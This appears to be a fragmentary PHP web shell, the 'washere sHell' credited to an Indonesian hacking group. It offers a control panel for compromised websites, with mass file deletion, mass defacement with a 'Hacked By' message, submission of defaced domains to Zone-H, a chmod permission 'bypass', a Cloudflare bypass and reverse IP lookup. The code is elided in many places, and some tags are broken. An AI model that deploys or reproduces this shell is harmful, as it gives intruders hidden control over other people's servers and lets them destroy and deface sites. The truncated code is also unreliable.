...
?>
	...
	<head>
		...
		<meta name="author" content="washere" />
		<meta name="copyright" content="{ washere }" />
		<title>{ washere sHell }</title>
	...
	<body onclick="playAudio();" class="bg-dark text-light">
		<center>
			<div class="container" style="margin-top: 15%">
				<div class="col-lg-6">
					<div class="form-group">
						<h1 class="text-center">{ WASHERE }</h1>
...
<body onclick="playAudio();" class="bg-dark text-light">
	...
	<style>
		...
		.about .card-body .img {
			position: relative;
			background: url(https://www.freepnglogos.com/uploads/hacker-png/hacker-interpol-arrests-suspected-anonymous-hackers-motley-5.png);
        ...
        <style>
         @import url(https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap);
          h1,div,h2,h5,a,i{
			...
			<h1 class="text-center"><a href="https://facebook.com/IndoSecOfficial" style="color:#ffffff;">{ washere }</h1>
			...
			<div class="text-center">
             <div class="shadow">
				<div class="d-flex justify-content-center flex-wrap">
					...
					<a href="?dir=' . $dir . '&aksi=zone-h" class="fiture btn btn-danger btn-sm"><i class="fas fa-bell"></i> zone-h</a>
                    ...
                    <a href="?dir=' . $dir . '&aksi=jso" class="fiture btn btn-warning btn-sm"><i class="fas fa-tools"></i> Jso creator</a>
					<a href="?dir=' . $dir . '&aksi=md5" class="fiture btn btn-warning btn-sm"><i class="fas fa-tools"></i> Md5 hash </a>
	...
	if (isset($_GET['about'])) {
		echo '<br><div class="card text-center bg-light about">
				<h4 class="card-header">{ Wahere }</h4>
				<div class="card-body">
					<center><div class="img"></div></center>
					<p class="card-text">{ washere } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
				</div>
				<div class="card-footer">
					<p class="card-text"><small class="text-muted">Copyright 2019 { washere }</small></p>
				</div>
			</div><br/>';
		exit;
	}
	...
	if ($_GET['aksi'] == 'masdel') {
		...
		if ($_POST['start']) {
			...
			echo "<form method='post'>
					<h5><i class='fa fa-folder'></i> Lokasi :</h5>pee
	...
	if ($_GET['aksi'] == 'masdef') {
		...
		if ($_POST['start']) {
			...
			echo "<form method='post'>
				...
				<textarea name='script' class='form-control' rows='5' autocomplete='off' placeholder='[Ex] Hacked By { washere }'></textarea><br/>
	...
	*/
	...
	if ($_GET['aksi'] == 'bypascf') {
		...
		if ($_POST['idsPilih'] == "ftp") {
			...
			echo "<br><p align='center' dir='ltr'><font face='Kelly Slab' size='2' color='#00ff00'>Correct 
	...
	<center><br>
		<form name="charCodeAt" method="post">
			<textarea class="form-control" name="input" placeholder="Script Deface"></textarea><br><br>
			<input class="btn btn-warning btn-block" type="button" onclick="runCharCodeAt()" value="Convert"><br><br>
			<textarea class="form-control"  name="output" placeholder="Hasil Convert"></textarea><br><br>
			<input  class="btn btn-warning btn-block" type="submit" name="submit" value="Pastebin">
		</form>';
		if (isset($_POST['submit'])) {
			if (empty($_POST['output'])) {
				...
				echo "<br><textarea class='form-control'>" . $kk . "</textarea>";
			}
		}
		exit;
	}
	...
	if ($_GET['aksi'] == 'md5') {
		echo '<br>
		 <form method="POST">
		 <input class="form-control" type="text" name="anu">
		 <input class="btn btn-warning btn-block" type="submit" name="ok" value="MD5">
		 </form>
		 ';
		if (isset($_POST['ok'])) {
			echo md5(trim($_POST['anu']));
		}
		exit;
	}
	...
	if ($_GET['aksi'] == 'bypschm') {
		...
		if ($_POST) {
			...
			$ch = @chmod($tsec, '0311');
			if ($ch) {
				echo " Directory  <font face='Kelly Slab' size='4' color='blue'> ->{$tsec}                Permission Changed Successfully Bypassed ";
			} else {
				echo " Directory  <font face='Kelly Slab' size='4' color='black'> ->{$tsec}                Permission Can't Be Changed , Chmod Function Is Disabled ";
			}
		}
		exit;
	}
	...
	if ($_GET['aksi'] == 'zone-h') {
		...
		<br><form method=POST>
		<form action="" method="post">
	<input class="form-control" type="text" name="defacer"  placeholder="Nickname" /><br>
	...
	<br>
	<textarea class="form-control" name="domain" placeholder="http://sites.com/" resize: none;"></textarea>
	<p>(1 Domain Per Lines)</p>
	<input class="btn btn-warning btn-block" type="submit" value="oi" name="SendNowToZoneH" />
	</form></form>';
	...
	if ($_GET['aksi'] == 'revip') {
		echo '<br><form method="POST">
		 <input class="form-control" type="text" name="url" placeholder="cybersinc.com">
		 <input class="btn btn-warning btn-block" type="submit" name="go" value="Go">
		 </form>';
		if (isset($_POST['go'])) {
			...
			echo "<textarea class='form-control'>.$result.</textarea>";
		}
		exit;
	}
	...
	if ($_GET['aksi'] == 'base64') {
		...
		<textarea class='form-control' name='base64' rows='5' cols='71'></textarea><br>  
		<input class='btn btn-warning btn-block' type='submit' name='submit' value='Encode'> 
		<input class='btn btn-warning btn-block' type='submit' name='submit2' value='Decode'>";
		if (isset($_POST['submit'])) {
			$base64 = $_POST['base64'];
			$encode = base64_encode($base64);
			echo "<textrea class='form-control'>Encode:.$encode</textarea>";
		}
		if (isset($_POST['submit2'])) {
			$base64 = $_POST['base64'];
			$decode = base64_decode($base64);
			echo "<textrea class='form-control'>Decode:.$decode</textarea> ";
		}
		exit;
	}
	...
	echo '</table></div></div><hr/><a href="https://facebook.com/IndoSecOfficial" class="text-muted">Copyright 2019 { washere }</a></center><br/>';
